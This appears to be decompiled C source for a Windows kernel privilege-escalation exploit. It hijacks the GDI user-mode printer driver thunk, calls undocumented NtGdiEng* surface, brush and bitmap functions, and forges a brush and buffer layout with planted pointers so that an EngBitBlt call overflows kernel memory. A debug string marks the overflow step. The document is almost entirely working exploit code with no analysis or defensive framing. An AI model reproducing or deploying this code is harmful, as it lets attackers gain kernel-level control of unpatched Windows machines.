NTSTATUS fakeGdiPrinterThunk(HUMPD hUMPD, ULONG64 *pOutputBuf, DWORD *pdwOutputBufSize) {
    
    NTSTATUS ret = 0;
    WORD    wServicePackMinor = g_pVersionInfo->wServicePackMinor;
    DWORD    v12 = 0;
    DWORD    v11 = 0;
    DWORD    v10 = 0;
    ULONG64 v22 = 0;
    ULONG64 v23 = 0;
    char    v24 = 0;
    DWORD    *v16 = NULL;
    DWORD    v18 = 0;

    v11 = dword_140010310[wServicePackMinor];
    g_pNtGdiEngAssociateSurface = (NTGDIENGASSOCIATESURFACE)g_GdiFunTab[7];

    if (hUMPD) {
        v12 = *(DWORD*)((ULONG64)hUMPD + 4);
    }

    if (wServicePackMinor != 2 && v11 + 1 >= v12) {
        v10 = g_pNtGdiEngAssociateSurface((HSURF)*(_QWORD *)((ULONG64)hUMPD + 0x10), (HDEV)1, (ULONG64)&v23, (ULONG64)&v22);//参数数量
        if (!v10) {
            return -1;
        }

    }

    if (v11 + 1 == v12) {
        ULONG64 v14 = (ULONG64)&v24;
        if (wServicePackMinor != 2) {
            v14 = (ULONG64)&unk_140010340;
        }
        ret = 0;
        *pOutputBuf = v14;
        *pdwOutputBufSize = *(DWORD*)((ULONG64)hUMPD + 8);
    }
    else {
        ret = v22;
    }

    switch (v12)
    {
    case 2u:
        dword_1400114A8 = 1;
        if (ho)
            DeleteObject(ho);
        ho = 0i64;
        v16 = &dword_1400114A8;
        goto LABEL_35;
    case 3u:
        ret = sub_140001AE0(hUMPD, pOutputBuf, pdwOutputBufSize);
        goto LABEL_37;
    case 4u:
        dword_1400114A8 = 1;
        if (g_hSURF_140011648)
        {
            g_pNtGdiEngDeleteSurface = (NTGDIENGDELETESURFACE)g_GdiFunTab[5];
            g_pNtGdiEngDeleteSurface((HSURF)g_hSURF_140011648);
        }
        g_hSURF_140011648 = 0i64;
        v16 = &dword_1400114A8;
        goto LABEL_35;
    case 0x12u:
        ret = sub_140001C70(hUMPD, pOutputBuf, pdwOutputBufSize);
        goto LABEL_37;
    case 0x22u:
        dword_1400114A4 = 1;
        v16 = &dword_1400114A4;
        goto LABEL_35;
    case 0x23u:
        dword_1400114A0 = 1;
        v16 = &dword_1400114A0;
        goto LABEL_35;
    default:
        if ((_DWORD)wServicePackMinor != 2 && v11 + 4 == v12)
        {
            v18 = dword_140010310[wServicePackMinor];
            if (v18)
            {
                DWORD v19 = v18;
                DWORD *v20 = unk_140012760;
                while (v19)
                {
                    *v20 = 1;
                    ++v20;
                    --v19;
                }
            }
            *pOutputBuf = (ULONG64)unk_140012760;
        LABEL_36:
            ret = 0;
            *pdwOutputBufSize = *(DWORD *)((ULONG64)hUMPD + 8);
            goto LABEL_37;
        }
        if (!v12)
        {
            ret = sub_140001A00(hUMPD, pOutputBuf, pdwOutputBufSize);
            goto LABEL_37;
        }
        if (v12 == 1)
        {
            
            dword_14001149C = 1;
            g_hDEV_140011750 = (HDEV)*(_QWORD *)((ULONG64)hUMPD + 0x20);
            v16 = &dword_14001149C;
        LABEL_35:
            *pOutputBuf = (ULONG64)v16;
            goto LABEL_36;
        }
    LABEL_37:
        if (v10 != 1 || g_pNtGdiEngAssociateSurface((HSURF)v23, 0i64, (ULONG64)hUMPD + 16, 0i64)) {
            //ret = ret;
        }
        else {
            ret = -1;
        }
            
        return ret;
    }

    return 0;
}

ULONG64 sub_140001A00(HUMPD hUMPD, ULONG64 *pOutputBuf, DWORD *pdwOutputBufSize) {
    __int64 v3; // rdi@1
    __int64 v4; // rbx@1
    __int64 v5; // rsi@1
    _DWORD *v6; // r12@1
    _QWORD *v7; // rbp@1
    HPALETTE v8; // rax@1
    LOGPALETTE plpal; // [sp+20h] [bp-38h]@1

    v3 = *(_QWORD *)((ULONG64)hUMPD + 0x48);
    v4 = *(_QWORD *)((ULONG64)hUMPD + 0x58);
    *(_DWORD *)&plpal.palNumEntries = 0;
    *(_WORD *)&plpal.palPalEntry[0].peBlue = 0;
    v5 = (ULONG64)hUMPD;
    plpal.palVersion = 768;
    v6 = pdwOutputBufSize;
    v7 = pOutputBuf;
    plpal.palNumEntries = 1;
    v8 = CreatePalette(&plpal);
    *(_QWORD *)(v4 + 296) = (_QWORD)v8;
    *(_DWORD *)(v3 + 16) = 96;
    *(_DWORD *)(v3 + 8) = 96;
    *(_DWORD *)(v3 + 20) = 96;
    *(_DWORD *)(v3 + 12) = 96;
    ho = v8;
    *(_QWORD *)(v5 + 136) = 0i64;
    *(_QWORD *)(v5 + 144) = 0i64;
    *(_QWORD *)(v5 + 152) = 0i64;
    *(_QWORD *)(v5 + 160) = 0i64;
    *(_DWORD *)(v5 + 168) = 0;
    qword_140011490 = (__int64)&unk_140011760;
    *v7 = (ULONG64)&qword_140011490;
    *v6 = *(_DWORD *)(v5 + 8);

    return 0;
}


ULONG64 sub_140001AE0(HUMPD hUMPD, ULONG64 *pOutputBuf, DWORD *pdwOutputBufSize) {
    SIZEL size;

    size.cx = 0x64;
    size.cy = 0x64;
    g_pNtGdiEngCreateDeviceSurface = (NTGDIENGCREATEDEVICESURFACE)g_GdiFunTab[4];
    HSURF hSURF = g_pNtGdiEngCreateDeviceSurface((DHSURF)&unk_140011650, size, 3L);
    g_hSURF_140011648 = hSURF;

    if (hSURF) {
        g_pNtGdiEngAssociateSurface_2 = (NTGDIENGASSOCIATESURFACE)g_GdiFunTab[6];
        g_pNtGdiEngAssociateSurface_2(hSURF, g_hDEV_140011750, 0x5ff, 0);
    }

    *pOutputBuf = (ULONG64)&g_hSURF_140011648;
    *pdwOutputBufSize = *(_DWORD *)((ULONG64)hUMPD + 8);
    return 0;
}


ULONG64 sub_140001C70(HUMPD hUMPD, ULONG64 *pOutputBuf, DWORD *pdwOutputBufSize) {
    BYTE v24[0x410] = { 0 };
    RECTL rect;
    POINTL point;
    SURFOBJ* pSurObj1 = NULL;
    SURFOBJ* pSurObj2 = NULL;
    g_pNtGdiBRUSHOBJ_pvAllocRbrush = (NTGDIBRUSHOBJ_PVALLOCRBRUSH)g_GdiFunTab[9];
    OutputDebugStringW(L"int the overflow!!!");

    PVOID brush = g_pNtGdiBRUSHOBJ_pvAllocRbrush(*(BRUSHOBJ**)((ULONG64)hUMPD + 0x58), 0x1000);
   
    rect.left = 0;
    rect.top = 0;
    rect.right = 0x5A;
    rect.bottom = 0x5A;
    point.x = 5;
    point.y = 5;
    sub_140001B90((ULONG64)&v24, (ULONG64)brush);

    g_pNtGdiEngCreateBitmap = (NTGDIENGCREATEBITMAP)g_GdiFunTab[10];

    SIZEL size;
    size.cx = 0xC8;
    size.cy = 0xC8;
    HBITMAP hBM1 = g_pNtGdiEngCreateBitmap(size, 150, 6, 0, 0);

    size.cx = 0x12C;
    size.cy = 0x12C;
    HBITMAP hBM2 = g_pNtGdiEngCreateBitmap(size, 100, 6, 0, 0);

    g_pNtGdiEngAssociateSurface_2 = (NTGDIENGASSOCIATESURFACE)g_GdiFunTab[6];
    if (hBM1 && hBM2 && g_pNtGdiEngAssociateSurface_2((HSURF)hBM1, g_hDEV_140011750, 0, 0)) {

        g_pNtGdiEngLockSurface = (NTGDIENGLOCKSURFACE)g_GdiFunTab[11];
        pSurObj1 = g_pNtGdiEngLockSurface((HSURF)hBM1);
        pSurObj2 = g_pNtGdiEngLockSurface((HSURF)hBM2);
        if (pSurObj1) {
            if (pSurObj2) {
                XLATEOBJ *pxlo = (XLATEOBJ*)pSurObj1->pvScan0;
                memset(pxlo, -1, 0x64);

                if (g_AllocBuffer) {
                    *(ULONG64 *)(v24 + 0x60) = g_AllocBuffer;
                    *(ULONG64 *)(v24 + 0x68) = g_AllocBuffer;
                    *(ULONG64 *)(v24 + 0x330) = g_AllocBuffer;

                    g_pNtGdiEngBitBlt = (NTGDIENGBITBLT)g_GdiFunTab[13];
                    g_pNtGdiEngBitBlt(pSurObj1, pSurObj2, 0, 0, 0, &rect, 
                        &point, 0, (BRUSHOBJ*)*(ULONG64*)((ULONG64)hUMPD + 0x58), 0, 0xCCAA);
                }

            }
        }

    }
    else {
        /* pSurObj1 = (SURFOBJ*)(*(ULONG64*)point);
         pSurObj2 = (SURFOBJ*)point;*/
    }

    g_pNtGdiEngUnLockSurface = (NTGDIENGUNLOCKSURFACE)g_GdiFunTab[12];
    g_pNtGdiEngUnLockSurface(pSurObj1);
    g_pNtGdiEngUnLockSurface(pSurObj2);

    g_pNtGdiEngDeleteSurface = (NTGDIENGDELETESURFACE)g_GdiFunTab[5];

    g_pNtGdiEngDeleteSurface((HSURF)hBM1);
    g_pNtGdiEngDeleteSurface((HSURF)hBM2);
    return 0;
}

ULONG64 sub_140001B90(ULONG64 buffer, ULONG64 brush) {

    ULONG64 v2;

    v2 = 0i64;
    do
    {
        *(_BYTE *)(v2 + buffer) = 0;
        v2 += 2L;
    } while (v2 < 0x2D8);
    *(_QWORD *)(buffer + 512) = brush;
    *(_DWORD *)(brush + 56) = 60;
    *(_QWORD *)(brush + 24) = buffer + 0x29C;
    *(_QWORD *)(brush + 48) = buffer + 0x208;
    *(_QWORD *)(brush + 40) = buffer + 0x208;
    *(_QWORD *)(brush + 32) = buffer + 0x208;
    *(_QWORD *)(brush + 64) = buffer + 0x260;
    *(_QWORD *)(buffer + 612) = 0i64;
    *(_DWORD *)(buffer + 620) = 1;
    *(_DWORD *)(buffer + 0x260) = 9;
    *(_DWORD *)(buffer + 624) = 1;
    *(_QWORD *)(buffer + 628) = 0i64;
    *(_DWORD *)(buffer + 636) = 80;
    *(_DWORD *)(buffer + 640) = 80;
    *(_DWORD *)(buffer + 644) = 4;
    *(_QWORD *)(buffer + 0x240) = buffer;
    *(_QWORD *)(buffer + 0x230) = buffer;
    *(_QWORD *)(buffer + 0x238) = buffer;
    *(_DWORD *)(buffer + 24) = 2;
    *(_DWORD *)(buffer + 0x2CC) = 100;
    *(_QWORD *)(buffer + 0x80) = buffer + 680;
    return buffer;
}